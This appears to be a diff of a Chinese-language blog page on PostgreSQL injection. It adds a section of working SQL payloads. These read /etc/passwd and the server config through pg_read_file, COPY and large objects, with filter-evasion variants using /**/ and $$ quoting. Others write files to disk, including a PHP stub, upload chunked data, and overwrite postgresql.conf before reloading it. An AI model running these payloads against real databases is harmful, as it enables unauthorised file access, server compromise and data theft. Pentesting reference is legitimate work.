@@ -82,7 +82,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">账户操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BD%AC%E4%B9%89"><span class="toc-number">4.1.</span> <span class="toc-text">关于转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">盲注</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">账户操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BD%AC%E4%B9%89"><span class="toc-number">4.1.</span> <span class="toc-text">关于转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.2.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">5.</span> <span class="toc-text">文件操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE"><span class="toc-number">6.</span> <span class="toc-text">带外数据</span></a></li></ol>
     </div>
     <script>
     (function () {
@@ -345,7 +345,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Postgres/" style="color: #00a596">Postgres</a>
+                <a href="/blog/tags/Postgres/" style="color: #ffa2c4">Postgres</a>
             </span>
             
         </span>
@@ -359,7 +359,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">455字</span>
+        <span class="post-count">1k字</span>
       </span>
     </span>
 
@@ -368,7 +368,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">5分</span>
       </span>
     </span>
     
@@ -461,6 +461,97 @@ UPDATE user SET username &#x3D; E&#39;Peter\s Name&#39; WHERE id &#x3D; 1;<span 
 
 <p>if 判断：</p>
 <pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select case when (1&gt;0) then 1 else 0 end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<hr>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>读文件</p>
+<pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">-- 在早期的 PostgreSQL 版本中,pg_read_file 不允许使用绝对路径
+select pg_read_file(&#39;&#x2F;etc&#x2F;passwd&#39;);
+
+-- 单引号被转义的情况下使用
+select&#x2F;**&#x2F;PG_READ_FILE($$&#x2F;etc&#x2F;passwd$$)
+
+
+create table testf0x(t TEXT);
+copy testf0x from &#39;&#x2F;etc&#x2F;passwd&#39;;
+select * from testf0x limit 1 offset 0;
+
+
+Select lo_import(&#39;&#x2F;etc&#x2F;passwd&#39;,12345678);
+select array_agg(b)::text::int from(select encode(data,&#39;hex&#39;)b,pageno from pg_largeobject where loid&#x3D;12345678 order by pageno)a
+
+-- 单引号被转义的情况下使用
+select&#x2F;**&#x2F;lo_import($$&#x2F;etc&#x2F;passwd$$,11111);
+select&#x2F;**&#x2F;cast(encode(data,$$base64$$)as&#x2F;**&#x2F;integer)&#x2F;**&#x2F;from&#x2F;**&#x2F;pg_largeobject&#x2F;**&#x2F;where&#x2F;**&#x2F;loid&#x3D;11111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写文件</p>
+<pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">COPY (select &#39;&lt;?php phpinfo();?&gt;&#39;) to &#39;&#x2F;tmp&#x2F;1.php&#39;;
+COPY (select convert_from(decode(&#39;ZmZmZmZmZmYweA&#x3D;&#x3D;&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;&#x2F;tmp&#x2F;success.txt&#39;;
+
+
+select lo_from_bytea(12349,&#39;ffffffff0x&#39;);
+SELECT lo_export(12349, &#39;&#x2F;tmp&#x2F;ffffffff0x.txt&#39;);
+
+
+-- 记下生成的lo_creat ID
+select lo_creat(-1);
+
+-- 替换 24577 为生成的lo_creat ID
+INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode(&#39;ZmZmZmZmZmYweA&#x3D;&#x3D;&#39;, &#39;base64&#39;));
+select lo_export(24577, &#39;&#x2F;tmp&#x2F;success.txt&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分页上传</p>
+<pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">SELECT lo_create(12345);
+INSERT INTO pg_largeobject VALUES (12345, 0, decode(&#39;6666&#39;, &#39;hex&#39;));
+INSERT INTO pg_largeobject VALUES (12345, 1, decode(&#39;666666&#39;, &#39;hex&#39;));
+INSERT INTO pg_largeobject VALUES (12345, 2, decode(&#39;6666&#39;, &#39;hex&#39;));
+INSERT INTO pg_largeobject VALUES (12345, 3, decode(&#39;663078&#39;, &#39;hex&#39;));
+SELECT lo_export(12345, &#39;&#x2F;tmp&#x2F;ffffffff0x.txt&#39;);
+SELECT lo_unlink(12345);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select lo_create(11116);
+select lo_put(11116,0,&#39;dGVzdDEyM&#39;);
+select lo_put(11116,9,&#39;zQ1Ng&#x3D;&#x3D;&#39;);
+
+select lo_from_bytea(11141,decode(encode(lo_get(11116),&#39;escape&#39;),&#39;base64&#39;));
+select lo_export(11141,&#39;&#x2F;tmp&#x2F;test.txt&#39;);
+SELECT lo_unlink(11141);
+
+-- 查看创建的 lo_creat ID
+select * from pg_largeobject
+
+-- 使用 lo_unlink 进行删除
+SELECT lo_unlink(12345);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建文件夹</p>
+<pre class="line-numbers language-postgresql" data-language="postgresql"><code class="language-postgresql">select setting from pg_settings where name&#x3D;&#39;config_file&#39;	-- 查看配置文件路径
+select pg_read_file(&#39;&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&#x2F;postgresql.conf&#39;);
+
+-- 修改并覆盖配置文件
+log_destination &#x3D; &#39;csvlog&#39;
+log_directory &#x3D; &#39;&#x2F;tmp&#x2F;f0x&#39;
+log_filename &#x3D; &#39;postgresql-%Y-%m-%d_%H%M%S.log&#39;
+log_rotation_size &#x3D; 100MB
+log_rotation_age &#x3D; 1d
+log_min_messages &#x3D; INFO
+logging_collector &#x3D; on
+
+
+-- 将修改后的配置文件加载到largeobject中
+select lo_from_bytea(10001,decode(&#39;base64的配置文件内容&#39;,&#39;base64&#39;));
+-- 通过lo_export覆盖配置文件
+select lo_export(10001,&#39;&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&#x2F;postgresql.conf&#39;);
+SELECT lo_unlink(10001);
+
+-- 重新加载配置文件
+select pg_reload_conf();
+
+-- 查询一下修改是否成功
+select name,setting,short_desc from pg_settings where name like &#39;log_%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<hr>
+<h1 id="带外数据"><a href="#带外数据" class="headerlink" title="带外数据"></a>带外数据</h1>
     </div>
     
     
